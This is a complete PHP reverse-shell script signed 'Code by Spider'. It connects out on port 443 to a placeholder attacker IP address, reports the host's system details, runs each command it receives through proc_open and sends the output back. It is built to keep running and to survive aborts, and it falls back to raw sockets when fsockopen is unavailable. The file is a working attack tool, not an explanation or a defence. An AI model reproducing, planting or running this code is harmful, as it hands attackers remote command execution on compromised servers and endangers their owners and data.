<?php 
error_reporting (E_ERROR);
ignore_user_abort(true);
ini_set('max_execution_time',0);
$os = substr(PHP_OS,0,3);
$ipaddr = 'xxx.xxx.xxx.xxx';
$port = '443';
$descriptorspec = array(0 => array("pipe","r"),1 => array("pipe","w"),2 => array("pipe","w"));
$cwd = getcwd();
$msg = php_uname()."\n------------Code by Spider-------------\n";
if($os == 'WIN') {
    $env = array('path' => 'c:\\windows\\system32');
} else {
    $env = array('path' => '/bin:/usr/bin:/usr/local/bin:/usr/local/sbin:/usr/sbin');
}

if(function_exists('fsockopen')) {
    $sock = fsockopen($ipaddr,$port);
    fwrite($sock,$msg);
    while ($cmd = fread($sock,1024)) {
        if (substr($cmd,0,3) == 'cd ') {
            $cwd = trim(substr($cmd,3,-1));
            chdir($cwd);
            $cwd = getcwd();
        }
        if (trim(strtolower($cmd)) == 'exit') {
            break;
        } else {
            $process = proc_open($cmd,$descriptorspec,$pipes,$cwd,$env);
            if (is_resource($process)) {
                fwrite($pipes[0],$cmd);
                fclose($pipes[0]);
                $msg = stream_get_contents($pipes[1]);
                fwrite($sock,$msg);
                fclose($pipes[1]);
                $msg = stream_get_contents($pipes[2]);
                fwrite($sock,$msg);
                fclose($pipes[2]);
                proc_close($process);
            }
        }
    }
    fclose($sock);
} else {
    $sock = socket_create(AF_INET,SOCK_STREAM,SOL_TCP);
    socket_connect($sock,$ipaddr,$port);
    socket_write($sock,$msg);
    fwrite($sock,$msg);
    while ($cmd = socket_read($sock,1024)) {
        if (substr($cmd,0,3) == 'cd ') {
            $cwd = trim(substr($cmd,3,-1));
            chdir($cwd);
            $cwd = getcwd();
        }
        if (trim(strtolower($cmd)) == 'exit') {
            break;
        } else {
            $process = proc_open($cmd,$descriptorspec,$pipes,$cwd,$env);
            if (is_resource($process)) {
                fwrite($pipes[0],$cmd);
                fclose($pipes[0]);
                $msg = stream_get_contents($pipes[1]);
                socket_write($sock,$msg,strlen($msg));
                fclose($pipes[1]);
                $msg = stream_get_contents($pipes[2]);
                socket_write($sock,$msg,strlen($msg));
                fclose($pipes[2]);
                proc_close($process);
            }
        }
    }
    socket_close($sock);
}
?>